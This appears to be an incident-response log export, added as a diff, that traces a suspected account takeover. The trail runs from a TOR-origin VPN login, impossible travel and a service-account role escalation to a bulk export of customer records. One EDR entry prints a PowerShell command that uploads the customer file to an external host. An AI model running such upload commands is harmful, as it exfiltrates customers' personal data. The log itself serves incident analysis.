@@ -1,0 +1,23 @@
+SECURITY INCIDENT EXPORT — Case #INC-2026-0473
+Window: 2026-08-09 22:10 – 23:55 UTC
+Source systems: VPN gateway, IdP (Okta), CRM (customer database), DLP, EDR
+
+--- Authentication / access ---
+2026-08-09 22:12:41  vpn-gw  user=j.harlow  src_ip=185.220.101.44 (known TOR exit, DE)  result=ACCEPT  mfa=push-approved
+2026-08-09 22:13:02  okta    user=j.harlow  event=session.start  device=unrecognized  location=Frankfurt, DE
+   note: j.harlow's normal work location is Austin, US — two authenticated sessions ~8,000 km apart within minutes (impossible travel).
+2026-08-09 22:19:55  okta    user=svc-reporting  event=app.role.assign  target=CRM-Admin  actor=j.harlow
+   note: j.harlow granted the reporting service account the CRM-Admin role, which it had never held before.
+
+--- Data access / export ---
+2026-08-09 22:41:10  crm  actor=svc-reporting  action=bulk_export  object=customers  rows=248,913
+2026-08-09 22:43:30  dlp  actor=svc-reporting  file=customers_full.csv  size=612MB  channel=https  dest=filebin.example (external)
+   columns observed: full_name, email, phone, date_of_birth, national_id, billing_address, card_last4
+
+--- Endpoint ---
+2026-08-09 22:58:12  edr  host=LT-JHARLOW  proc=powershell.exe  parent=explorer.exe  signed=false  reputation=unknown
+   cmdline: Invoke-WebRequest -Uri https://filebin.example/upload -Method POST -InFile C:\Users\jharlow\customers_full.csv
+
+--- Timing ---
+All activity between 22:10 and 23:55 UTC falls outside j.harlow's normal working hours (13:00–22:00 UTC).
+The account showed no prior history of bulk exports or role administration.
